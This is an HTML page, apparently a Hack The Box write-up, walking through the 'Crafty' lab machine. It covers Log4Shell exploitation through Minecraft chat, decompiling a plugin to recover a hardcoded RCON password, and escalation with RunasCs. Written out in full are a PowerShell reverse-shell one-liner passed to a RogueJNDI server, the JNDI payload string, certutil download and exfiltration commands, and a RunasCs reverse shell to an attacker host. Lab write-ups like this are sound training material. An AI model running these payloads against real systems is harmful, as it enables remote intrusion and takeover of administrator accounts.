@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTB Crafty — Full Walkthrough</title>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>:root{--bg:#0c0e12;--surface:#13161c;--surface-raised:#1a1e26;--border:#262b36;--text:#c8cdd6;--text-muted:#6b7280;--heading:#e8ecf2;--accent:#4ade80;--accent-dim:#166534;--red:#f87171;--amber:#fbbf24;--blue:#60a5fa;--purple:#c084fc;--cyan:#22d3ee;--code-bg:#0a0c10}*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Inter',-apple-system,sans-serif;background:var(--bg);color:var(--text);line-height:1.7;-webkit-font-smoothing:antialiased}.hero{border-bottom:1px solid var(--border);padding:4rem 2rem 3rem;position:relative}.hero::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--blue),var(--red))}.hero-inner{max-width:860px;margin:0 auto}.hero-label{font-family:'IBM Plex Mono',monospace;font-size:.75rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1rem}.hero h1{font-size:2.8rem;font-weight:700;color:var(--heading);letter-spacing:-.03em}.hero h1 span{color:var(--accent)}.hero-meta{margin-top:1.2rem;display:flex;gap:2rem;flex-wrap:wrap;font-family:'IBM Plex Mono',monospace;font-size:.8rem;color:var(--text-muted)}.hero-meta strong{color:var(--text)}.chain{background:var(--surface);border-bottom:1px solid var(--border);padding:1.5rem 2rem;overflow-x:auto}.chain-inner{max-width:860px;margin:0 auto;display:flex;align-items:center;gap:0;white-space:nowrap;font-family:'IBM Plex Mono',monospace;font-size:.78rem}.chain-node{padding:.4rem .9rem;border-radius:4px;font-weight:500}.chain-node.green{background:var(--accent-dim);color:var(--accent)}.chain-node.blue{background:#1e3a5f;color:var(--blue)}.chain-node.red{background:#5f1e1e;color:var(--red)}.chain-arrow{color:var(--text-muted);padding:0 .5rem}.content{max-width:860px;margin:0 auto;padding:3rem 2rem 6rem}.phase{margin-top:3.5rem;margin-bottom:2rem;padding-bottom:.8rem;border-bottom:1px solid var(--border)}.phase:first-child{margin-top:0}.phase-number{font-family:'IBM Plex Mono',monospace;font-size:.7rem;letter-spacing:.15em;text-transform:uppercase;margin-bottom:.3rem}.phase-number.green{color:var(--accent)}.phase-number.blue{color:var(--blue)}.phase-number.red{color:var(--red)}.phase h2{font-size:1.6rem;font-weight:700;color:var(--heading)}h3{font-size:1.15rem;font-weight:600;color:var(--heading);margin-top:2.2rem;margin-bottom:.8rem}p{margin-bottom:1rem}pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:1.2rem 1.4rem;overflow-x:auto;margin:1rem 0 1.4rem;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:1.65;color:var(--text)}pre .comment{color:var(--text-muted)}pre .cmd{color:var(--accent)}pre .output{color:#8b949e}pre .highlight{color:var(--amber)}pre .important{color:var(--red)}code{font-family:'IBM Plex Mono',monospace;font-size:.88em;background:var(--surface-raised);padding:.15em .4em;border-radius:3px;color:var(--cyan)}pre code{background:none;padding:0;color:inherit}.callout{border-radius:6px;padding:1rem 1.2rem;margin:1.2rem 0;font-size:.92rem;line-height:1.6}.callout-why{background:#1a1e26;border-left:3px solid var(--blue)}.callout-why .callout-label{color:var(--blue)}.callout-key{background:#1a1220;border-left:3px solid var(--purple)}.callout-key .callout-label{color:var(--purple)}.callout-warn{background:#1e1a12;border-left:3px solid var(--amber)}.callout-warn .callout-label{color:var(--amber)}.callout-label{font-family:'IBM Plex Mono',monospace;font-size:.72rem;font-weight:600;letter-spacing:.1em;text-transform:uppercase;display:block;margin-bottom:.3rem}.takeaway{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.5rem;margin:2rem 0}.takeaway h3{margin-top:0}.takeaway-item{padding:.5rem 0;border-bottom:1px solid var(--border)}.takeaway-item:last-child{border-bottom:none}.takeaway-item strong{color:var(--heading)}.takeaway-item p{margin-bottom:0}.diagram{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:2rem;margin:1.5rem 0;text-align:center;font-family:'IBM Plex Mono',monospace;font-size:.82rem;line-height:2;color:var(--text);overflow-x:auto}.diagram .node{display:inline-block;padding:.3rem .8rem;border-radius:4px}.diagram .node-green{background:var(--accent-dim);color:var(--accent)}.diagram .node-blue{background:#1e3a5f;color:var(--blue)}.diagram .node-red{background:#5f1e1e;color:var(--red)}.diagram .arrow{color:var(--text-muted);margin:0 .3rem}.footer{text-align:center;padding:2rem;font-family:'IBM Plex Mono',monospace;font-size:.75rem;color:var(--text-muted);border-top:1px solid var(--border);margin-top:4rem}@media(max-width:640px){.hero h1{font-size:1.8rem}.content{padding:2rem 1rem 4rem}pre{font-size:.75rem;padding:1rem}}</style>
+</head>
+<body>
+<div id="gate" style="position:fixed;inset:0;z-index:9999;background:var(--bg);display:flex;align-items:center;justify-content:center;"><div style="text-align:center;font-family:'IBM Plex Mono',monospace;"><div style="font-size:2.4rem;margin-bottom:.3rem;">⛏️</div><div style="font-size:.72rem;letter-spacing:.12em;text-transform:uppercase;color:var(--accent);margin-bottom:1.2rem;">HTB Writeup — Restricted</div><div style="color:var(--text-muted);font-size:.85rem;margin-bottom:1.5rem;max-width:320px;line-height:1.6;">This writeup contains spoilers for an HTB machine.<br>Enter the password to continue.</div><input id="gate-pw" type="password" placeholder="Password" autofocus style="background:var(--surface);border:1px solid var(--border);color:var(--heading);padding:.6rem 1rem;border-radius:4px;font-family:inherit;font-size:.9rem;width:220px;text-align:center;outline:none;" onkeydown="if(event.key==='Enter')checkPw()"><br><button onclick="checkPw()" style="margin-top:.8rem;background:var(--accent-dim);color:var(--accent);border:1px solid var(--accent);padding:.5rem 1.8rem;border-radius:4px;font-family:inherit;font-size:.82rem;cursor:pointer;">Enter</button><div id="gate-err" style="color:var(--red);font-size:.78rem;margin-top:.8rem;visibility:hidden;">Incorrect password</div><div style="color:var(--text-muted);font-size:.7rem;margin-top:2rem;opacity:.4;font-style:italic;direction:rtl;unicode-bidi:bidi-override;">Tessera est nomen machinae</div></div></div>
+<script>function checkPw(){if(document.getElementById('gate-pw').value==='crafty'){document.getElementById('gate').style.display='none';sessionStorage.setItem('htb-auth-crafty','1')}else{document.getElementById('gate-err').style.visibility='visible';document.getElementById('gate-pw').value=''}}if(sessionStorage.getItem('htb-auth-crafty')==='1')document.getElementById('gate').style.display='none';</script>
+
+<header class="hero"><div class="hero-inner"><div class="hero-label">Hack The Box — Walkthrough</div><h1><span>Crafty</span></h1><div class="hero-meta"><span>OS <strong>Windows</strong></span><span>Difficulty <strong>Easy</strong></span><span>Ports <strong>80 · 25565</strong></span><span>Author <strong><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a></strong></span></div></div></header>
+
+<div class="chain"><div class="chain-inner"><span class="chain-node green">Minecraft Log4Shell → svc_minecraft shell</span><span class="chain-arrow">→</span><span class="chain-node blue">Decompile plugin → RCON password</span><span class="chain-arrow">→</span><span class="chain-node red">RunasCs → Administrator</span></div></div>
+
+<main class="content">
+
+<div class="phase"><div class="phase-number green">Phase 0</div><h2>Reconnaissance</h2></div>
+
+<h3>Nmap</h3>
+<pre><code><span class="cmd">$ sudo nmap -sCV -p- -T4 10.129.230.193</span>
+<span class="output">PORT      STATE SERVICE   VERSION
+80/tcp    open  http      Microsoft IIS httpd 10.0
+|_http-title: Did not follow redirect to http://crafty.htb
+<span class="highlight">25565/tcp open  minecraft Minecraft 1.16.5</span> (Protocol: 127, Message: Crafty Server, Users: 0/100)
+Service Info: OS: Windows</span></code></pre>
+
+<pre><code><span class="cmd">$ echo "10.129.230.193 crafty.htb" | sudo tee -a /etc/hosts</span></code></pre>
+
+<p>Port 80 is IIS (just a landing page). Port 25565 is a <strong>Minecraft Java Edition 1.16.5</strong> server — which uses <strong>Log4j</strong> for logging.</p>
+
+<div class="callout callout-why">
+<span class="callout-label">Why Minecraft + Log4j = RCE</span>
+Minecraft Java Edition uses Apache Log4j for all logging, including player chat messages. Version 1.16.5 ships with a vulnerable Log4j version. When a player sends <code>${jndi:ldap://attacker/...}</code> in chat, Log4j parses it as a JNDI lookup, connects to the attacker's LDAP server, downloads and executes arbitrary Java code. This is <strong>CVE-2021-44228 (Log4Shell)</strong> — one of the most impactful vulnerabilities in history.
+</div>
+
+
+<div class="phase"><div class="phase-number green">Phase 1</div><h2>Initial Access — Log4Shell via Minecraft Chat</h2></div>
+
+<h3>Step 1: Connect with Minecraft Console Client</h3>
+<pre><code><span class="cmd">$ wget https://github.com/MCCTeam/Minecraft-Console-Client/releases/download/20231011-230/MinecraftClient-20231011-230-linux-x64
+$ chmod +x MinecraftClient-20231011-230-linux-x64</span>
+
+<span class="comment"># Connect — server is in offline mode, any username works, no password</span>
+<span class="cmd">$ ./MinecraftClient-20231011-230-linux-x64 anything "" 10.129.230.193</span>
+<span class="output">[MCC] Server is in offline mode.
+[MCC] Server was successfully joined.
+Type '/quit' to leave the server.</span></code></pre>
+
+<h3>Step 2: Start RogueJNDI (Malicious LDAP Server)</h3>
+<pre><code><span class="cmd">$ git clone https://github.com/veracode-research/rogue-jndi.git
+$ cd rogue-jndi
+$ mvn package</span>
+
+<span class="comment"># Launch with PowerShell reverse shell payload</span>
+<span class="cmd">$ java -jar target/RogueJndi-1.1.jar \
+  --command "powershell -nop -w hidden -c \"\$c=New-Object Net.Sockets.TCPClient('10.10.15.65',4444);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb+'PS '+(pwd).Path+'> ';\$s.Write(([text.encoding]::ASCII).GetBytes(\$sb2),0,\$sb2.Length)}\"" \
+  --hostname "10.10.15.65"</span></code></pre>
+
+<h3>Step 3: Start Listener + Send Payload</h3>
+<pre><code><span class="comment"># Terminal 1: listener</span>
+<span class="cmd">$ nc -lnvp 4444</span>
+
+<span class="comment"># In MCC chat: send the JNDI lookup string</span>
+<span class="cmd">/send ${jndi:ldap://10.10.15.65:1389/o=reference}</span></code></pre>
+
+<p>Log4j parses the message → connects to RogueJNDI → loads the PowerShell payload → reverse shell:</p>
+
+<pre><code><span class="output">PS C:\users\svc_minecraft\Desktop> cat user.txt
+e1345438f0500f713d38a9fb9ffff533</span></code></pre>
+
+
+<div class="phase"><div class="phase-number blue">Phase 2</div><h2>Enumeration — Decompiling the Custom Plugin</h2></div>
+
+<h3>Finding the Plugin</h3>
+<pre><code><span class="cmd">PS> dir /s /b *.jar</span>
+<span class="output">C:\Users\svc_minecraft\server\plugins\<span class="highlight">playercounter-1.0-SNAPSHOT.jar</span></span></code></pre>
+
+<div class="callout callout-key">
+<span class="callout-label">Why this JAR is suspicious</span>
+<code>SNAPSHOT</code> in the name = development/testing build, often with hardcoded credentials. It's the only custom plugin (9KB, tiny). Java <code>.jar</code> files are just ZIP archives containing <code>.class</code> bytecode — which is trivially decompilable back to readable source code.
+</div>
+
+<h3>Exfiltrate the JAR</h3>
+<pre><code><span class="comment"># On target: encode as base64 (certutil)</span>
+<span class="cmd">PS> copy C:\users\svc_minecraft\server\plugins\playercounter-1.0-SNAPSHOT.jar c:\temp\p.jar
+PS> certutil -encode c:\temp\p.jar c:\temp\b64.txt
+PS> type c:\temp\b64.txt</span></code></pre>
+
+<div class="callout callout-warn">
+<span class="callout-label">certutil base64 gotcha</span>
+<code>certutil -encode</code> wraps the output in <code>-----BEGIN CERTIFICATE-----</code> / <code>-----END CERTIFICATE-----</code> headers. Linux's <code>base64 -d</code> chokes on these lines. Strip them before decoding:
+</div>
+
+<pre><code><span class="comment"># On attacker: remove header/footer lines, then decode</span>
+<span class="cmd">$ sed '1d;$d' b64.txt | base64 -d > playercounter-1.0-SNAPSHOT.jar</span></code></pre>
+
+<h3>Decompile → Hardcoded RCON Password</h3>
+<pre><code><span class="comment"># Use jadx, JD-GUI, or javadecompilers.com</span>
+<span class="cmd">$ jadx playercounter-1.0-SNAPSHOT.jar</span></code></pre>
+
+<pre><code><span class="output">package htb.crafty.playercounter;
+
+public final class Playercounter extends JavaPlugin {
+   public void onEnable() {
+      Rcon rcon = null;
+      try {
+         rcon = new Rcon("127.0.0.1", 27015,
+            <span class="highlight">"s67u84zKq8IXw"</span>.getBytes());  <span class="comment">// ← hardcoded RCON password</span>
+      } catch (IOException e) { ... }
+   }
+}</span></code></pre>
+
+
+<div class="phase"><div class="phase-number red">Phase 3</div><h2>Privilege Escalation — RunasCs as Administrator</h2></div>
+
+<p>The RCON password is reused as the Administrator password. Use <strong>RunasCs</strong> to run commands as Administrator on Windows:</p>
+
+<h3>Upload RunasCs</h3>
+<pre><code><span class="comment"># Attacker: download and serve RunasCs</span>
+<span class="cmd">$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+$ unzip RunasCs.zip
+$ python3 -m http.server 8081</span>
+
+<span class="comment"># Target: download RunasCs</span>
+<span class="cmd">PS> certutil -urlcache -f http://10.10.15.65:8081/RunasCs.exe RunasCs.exe</span></code></pre>
+
+<div class="callout callout-why">
+<span class="callout-label">What is RunasCs?</span>
+Windows' built-in <code>runas</code> command requires an interactive desktop — it can't be used from a reverse shell. <strong>RunasCs</strong> is an open-source alternative that works from non-interactive sessions. It spawns a process as a specified user, optionally connecting its I/O to a reverse shell (<code>-r</code> flag). Think of it as Windows' equivalent of <code>su</code> for shells.
+</div>
+
+<h3>Verify Credentials + Get Admin Shell</h3>
+<pre><code><span class="comment"># Verify the password works</span>
+<span class="cmd">PS> .\RunasCs.exe Administrator s67u84zKq8IXw "cmd /c whoami"</span>
+<span class="output"><span class="highlight">crafty\administrator</span></span>
+
+<span class="comment"># Reverse shell as Administrator</span>
+<span class="cmd">PS> .\RunasCs.exe Administrator s67u84zKq8IXw cmd.exe -r 10.10.15.65:5555</span>
+
+<span class="comment"># Attacker: catch admin shell</span>
+<span class="cmd">$ nc -lnvp 5555</span>
+<span class="output">C:\Windows\system32> whoami
+crafty\administrator
+
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+30c852d39aed7ba210399f090e9f814f</span></code></pre>
+
+
+<div class="phase"><div class="phase-number" style="color:var(--purple);">Appendix</div><h2>Key Takeaways</h2></div>
+
+<div class="takeaway">
+<div class="takeaway-item"><strong>Minecraft servers are Log4Shell targets.</strong><p>Any Minecraft Java Edition server running pre-patched versions uses vulnerable Log4j. Player chat messages are logged → JNDI lookup → RCE. No authentication needed — just join and type.</p></div>
+<div class="takeaway-item"><strong>RogueJNDI automates the entire Log4Shell chain.</strong><p>It hosts both the LDAP redirector and the HTTP class server. One command + one chat message = shell.</p></div>
+<div class="takeaway-item"><strong>Java JARs are trivially decompilable.</strong><p><code>.jar</code> = ZIP of <code>.class</code> bytecode. Tools like jadx/JD-GUI recover near-original source. Developers who hardcode secrets in Java have no hiding place.</p></div>
+<div class="takeaway-item"><strong><code>certutil -encode</code> adds headers that break Linux base64.</strong><p>Strip the <code>-----BEGIN/END CERTIFICATE-----</code> lines before decoding. Use <code>sed '1d;$d'</code> for a quick fix.</p></div>
+<div class="takeaway-item"><strong>RunasCs is essential for Windows privilege escalation.</strong><p>Windows' native <code>runas</code> doesn't work from non-interactive shells. RunasCs fills that gap with reverse shell support (<code>-r</code> flag). Keep it in your toolbox alongside PowerShell credential objects.</p></div>
+</div>
+
+<div class="diagram"><span class="node node-green">Minecraft chat</span><span class="arrow">→</span><span class="node node-green">Log4Shell</span><span class="arrow">→</span><span class="node node-green">RogueJNDI → shell</span><span class="arrow">→</span><span class="node node-blue">decompile JAR → RCON pw</span><span class="arrow">→</span><span class="node node-red">RunasCs → Administrator</span></div>
+
+</main>
+<footer class="footer"><a href="https://app.hackthebox.com/" style="color:var(--accent);text-decoration:none;">Nauhcnes</a> · HTB Crafty Writeup · 2026</footer>
+</body></html>
